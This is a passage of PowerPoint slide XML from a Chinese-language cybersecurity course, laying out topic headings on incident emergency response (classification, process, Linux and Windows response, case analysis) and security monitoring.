            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="211"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>人才队伍建设</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="34" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5350915" y="4700817"/>
            <a:ext cx="2965501" cy="387251"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="35" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="122"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23"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24"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25"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21" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="216"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>设计并实施网络空间安全方案</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="36" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5364089" y="5587109"/>
            <a:ext cx="2952328" cy="369395"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="37" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="15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51"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5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5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49" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="249"/>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网络空间安全监测与维护</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="62994115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825693"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>课程内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="647564" y="3403360"/>
            <a:ext cx="1785938" cy="556655"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="99CCFF">
                  <a:gamma/>
                  <a:tint val="27451"/>
                  <a:invGamma/>
                </a:srgbClr>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应急响应</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="862844" y="5697078"/>
            <a:ext cx="1365250"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知识体</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3239852" y="5688207"/>
            <a:ext cx="1365250"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知识域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2557867" y="2376692"/>
            <a:ext cx="429957" cy="2622428"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 72540"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="36000" rIns="36000" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3053507" y="2132608"/>
            <a:ext cx="1806525" cy="495259"/>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事件分类和</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应急响应流程</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3094259" y="3427325"/>
            <a:ext cx="1776266"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应急响应处理</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text Box 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867400" y="5661074"/>
            <a:ext cx="2160984"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知识子域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="100" name="Group 13"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5361414" y="2996952"/>
            <a:ext cx="2738978" cy="371103"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="101" name="Group 14"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="103" name="AutoShape 15"/>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04" name="AutoShape 16"/>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05" name="AutoShape 17"/>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06" name="AutoShape 18"/>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02" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="271"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Linux</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>应急响应</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="107" name="Group 20"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5344241" y="3491982"/>
            <a:ext cx="2756151" cy="371103"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="108" name="Group 21"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="110" name="AutoShape 22"/>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11" name="AutoShape 23"/>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12" name="AutoShape 24"/>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13" name="AutoShape 25"/>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09" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="271"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Windows</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>应急响应</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="AutoShape 56"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4873341" y="3180030"/>
            <a:ext cx="418739" cy="1002634"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 77423"/>
              <a:gd name="adj2" fmla="val 51567"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="123" name="Group 58"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5359650" y="3980123"/>
            <a:ext cx="2733478" cy="411940"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="124" name="Group 59"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1481"/>
              <a:chExt cx="1363" cy="1802"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="126" name="AutoShape 60"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2272" y="1481"/>
                <a:ext cx="1363" cy="1802"/>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27" name="AutoShape 61"/>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28" name="AutoShape 62"/>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29" name="AutoShape 63"/>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dirty="0"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="125" name="Rectangle 64"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="224"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>其他应急响应</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2888574" y="2082659"/>
            <a:ext cx="27242" cy="3425528"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3131840" y="4680835"/>
            <a:ext cx="1710531"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常见事件和</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>案例分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="139" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5364089" y="4555895"/>
            <a:ext cx="2729040" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="140" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="142"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43"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44"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45"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41"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应急响应事件监测</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4960761" y="4618549"/>
            <a:ext cx="331319" cy="781626"/>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a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="147" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5364088" y="5107131"/>
            <a:ext cx="2721859" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="148" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="15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51"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5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5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49"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常见事件和案例分析</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5292080" y="1700808"/>
            <a:ext cx="0" cy="3807379"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="65" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5335367" y="1943791"/>
            <a:ext cx="2765025" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="66" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="68"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69"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70"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71"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67"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应急事件分类</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4932040" y="2006445"/>
            <a:ext cx="331319" cy="781626"/>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a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="73" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5335367" y="2495027"/>
            <a:ext cx="2765025" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="74" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="76"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77"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78"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79"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75"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应急响应流程</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12830669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611560" y="893178"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间安全保障背景</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25603" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
